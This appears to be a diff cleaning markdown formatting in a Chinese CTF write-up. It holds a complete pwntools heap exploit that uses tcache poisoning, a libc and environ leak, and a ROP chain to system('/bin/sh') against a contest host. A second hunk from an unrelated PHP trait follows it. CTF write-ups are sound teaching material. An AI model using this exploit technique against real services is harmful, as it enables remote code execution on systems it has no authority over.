@@ -2224,93 +2224,93 @@ for T in tqdm(TCandidate):
 4. 当只有一个大小的 tcache bin 的时候怎么做到在破坏了链的情况下多次建堆？_在 tcache bin 创建时会在堆顶创建 typedef struct tcache_perthread_struct，直接劫持它即可劫持任一 tcache bin 链_
 
 ```python
-**from** pwn **import** *
+from pwn import *
 
-context**.**log_level = "debug"
-**context**(arch="amd64", os="linux")
-context**.**terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+context(arch="amd64", os="linux")
+context.terminal = ['tmux','splitw','-h']
 
-**def** **p**(s,m):
-    **if** m **==** 0:
-        io = **process**(s)
-    **else**:
-        **if** ":" **in** s:
-            x = s**.split**(":")
+def p(s,m):
+    if m == 0:
+        io = process(s)
+    else:
+        if ":" in s:
+            x = s.split(":")
             addr = x[0]
-            port = **int**(x[1])
-            io = **remote**(addr,port)
-        **elif** " " **in** s:
-            x = s**.split**(" ")
+            port = int(x[1])
+            io = remote(addr,port)
+        elif " " in s:
+            x = s.split(" ")
             addr = x[0]
-            port = **int**(x[1])
-            io = **remote**(addr,port)
-        **else**:
-            **error**(f"{s} may be some error")
-    **return** io
+            port = int(x[1])
+            io = remote(addr,port)
+        else:
+            error(f"{s} may be some error")
+    return io
 
-**def** **gg**():
-    gdb**.attach**(io)
+def gg():
+    gdb.attach(io)
     raw_input()
 
-s   = **lambda** x  : io**.send**(x)
-sa  = **lambda** x,y: io**.sendafter**(x, y)
-sla = **lambda** x,y: io**.sendlineafter**(x, y)
-sl  = **lambda** x  : io**.sendline**(x)
-rv  = **lambda** x  : io**.recv**(x)
-ru  = **lambda** x  : io**.recvuntil**(x)
-rvl = **lambda**    : io**.recvline**()
-lg  = **lambda** x,y: log**.info**(f"\x1b[01;38;5;214m {x} => {**hex**(y)} \x1b[0m")
-ia  = **lambda**    : io**.interactive**()
-uu32 = **lambda** x   : **u32**(x**.ljust**(4,b'\x00'))
-uu64 = **lambda** x   : **u64**(x**.ljust**(8,b'\x00'))
-l32  = **lambda**     : **u32**(io**.recvuntil**(b"\xf7")[-4:]**.ljust**(4,b"\x00"))
-l64  = **lambda**     : **u64**(io**.recvuntil**(b"\x7f")[-6:]**.ljust**(8,b"\x00"))
+s   = lambda x  : io.send(x)
+sa  = lambda x,y: io.sendafter(x, y)
+sla = lambda x,y: io.sendlineafter(x, y)
+sl  = lambda x  : io.sendline(x)
+rv  = lambda x  : io.recv(x)
+ru  = lambda x  : io.recvuntil(x)
+rvl = lambda    : io.recvline()
+lg  = lambda x,y: log.info(f"\x1b[01;38;5;214m {x} => {hex(y)} \x1b[0m")
+ia  = lambda    : io.interactive()
+uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
+uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
+l32  = lambda     : u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
+l64  = lambda     : u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
 
-libc = **ELF**('/lib/x86_64-linux-gnu/libc.so.6') 
-io = **p**("106.14.191.23:59857",1)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+io = p("106.14.191.23:59857",1)
 
-**def** **create_user**(name):
-    **sla**(b'choice: ', b'1')
-    **sa**(b'enter user name: ', name)
+def create_user(name):
+    sla(b'choice: ', b'1')
+    sa(b'enter user name: ', name)
 
-**def** **free_user**(i):
-    **sla**(b'choice: ', b'2')
-    **sla**(b"enter user id: ",**str**(i)**.encode**())
-**def** **show_user**(i):
-    **sla**(b'choice: ', b'3')
-    **sla**(b"enter user id: ",**str**(i)**.encode**())
+def free_user(i):
+    sla(b'choice: ', b'2')
+    sla(b"enter user id: ",str(i).encode())
+def show_user(i):
+    sla(b'choice: ', b'3')
+    sla(b"enter user id: ",str(i).encode())
 
-**def** **edit_user**(i,name):
-    **sla**(b'choice: ', b'4')
-    **sla**(b"enter user id: ",**str**(i)**.encode**())
-    **sa**(b'enter new user name: ', name)
-    
-**for** i **in** **range**(10):
-    **create_user**(b"A")
-**for** i **in** **range**(9):
-    **free_user**(i)
-**sla**(b'choice: ', b'4' * 0x4000)
-**show_user**(7)
-t = **l64**()
+def edit_user(i,name):
+    sla(b'choice: ', b'4')
+    sla(b"enter user id: ",str(i).encode())
+    sa(b'enter new user name: ', name)
+
+for i in range(10):
+    create_user(b"A")
+for i in range(9):
+    free_user(i)
+sla(b'choice: ', b'4' * 0x4000)
+show_user(7)
+t = l64()
 libc_base = t + 0x7f7d6e91a000 - 0x7f7d6eb34d70
-**lg**("libc base",libc_base)
-**show_user**(0)
-ft = **u64**(**ru**(b"\x05")[-5:]**.ljust**(8,b"\x00"))
-**lg**("ft",ft)
-**edit_user**(6, **p64**(((ft<<12) - 0x1000 + 0xa0)^ft))
-**create_user**(b"a") #_ 10_
-**create_user**(b"a") #_ 11_
-**edit_user**(11,b"\x00"*8 + **p64**(libc_base + libc**.**sym["environ"] - 16))
-**create_user**(b"a"*16) #_ 12_
-**show_user**(12)
-t = **l64**()
-**lg**("environ",t)
-**edit_user**(11,b"\x00"*8 + **p64**(t - 0x888 + 0x740))
-**sla**(b'choice: ', b'1')
+lg("libc base",libc_base)
+show_user(0)
+ft = u64(ru(b"\x05")[-5:].ljust(8,b"\x00"))
+lg("ft",ft)
+edit_user(6, p64(((ft<<12) - 0x1000 + 0xa0)^ft))
+create_user(b"a") #_ 10_
+create_user(b"a") #_ 11_
+edit_user(11,b"\x00"*8 + p64(libc_base + libc.sym["environ"] - 16))
+create_user(b"a"*16) #_ 12_
+show_user(12)
+t = l64()
+lg("environ",t)
+edit_user(11,b"\x00"*8 + p64(t - 0x888 + 0x740))
+sla(b'choice: ', b'1')
 pop_rdi_ret = 0x2a3e5
 bin_sh = 0x1d8678
-**sa**(b'enter user name: ', **p64**((ft << 12) + 0x1000) + **p64**(libc_base + pop_rdi_ret) + **p64**(libc_base + bin_sh) + **p64**(libc_base + pop_rdi_ret + 1)+ **p64**(libc_base + libc**.**sym["system"]))
-**ia**()
+sa(b'enter user name: ', p64((ft << 12) + 0x1000) + p64(libc_base + pop_rdi_ret) + p64(libc_base + bin_sh) + p64(libc_base + pop_rdi_ret + 1)+ p64(libc_base + libc.sym["system"]))
+ia()
 ```
 
 ## jail
@@ -3215,32 +3215,32 @@ namespace Give\TestData\Framework;
 trait ProviderForwarder
 {
 
-    _/** @var array */_
-_    _protected $loadedProviders = [];
+    /** @var array */
+    protected $loadedProviders = [];
 
-    _/**_
-_     * Forward calls to a provider class._
-_     *_
-_     * @param string $name_
-_     * @param array  $arguments_
-_     *_
-_     * @return mixed_
-_     */_
-_    _public function __call($name, $arguments)
+    /**
+     * Forward calls to a provider class._
+     *
+     * @param string $name_
+     * @param array  $arguments_
+     *
+     * @return mixed_
+     */
+    public function __call($name, $arguments)
     {
         $provider = isset($this->loadedProviders[$name]) ? $this->loadedProviders[$name] : $this->loadProvider($name);
 
         return call_user_func_array($this->loadedProviders[$name], $arguments);
     }
 
-    _/**_
-_     * Load a provider by class name, adjusted for case._
-_     *_
-_     * @param string $name_
-_     *_
-_     * @return Contract\Provider_
-_     */_
-_    _protected function loadProvider($name)
+    /**
+     * Load a provider by class name, adjusted for case._
+     *
+     * @param string $name_
+     *
+     * @return Contract\Provider_
+     */
+    protected function loadProvider($name)
     {
         $providerClass = sprintf('%s\%s\%s', ___NAMESPACE___, 'Provider', ucfirst($name));
 
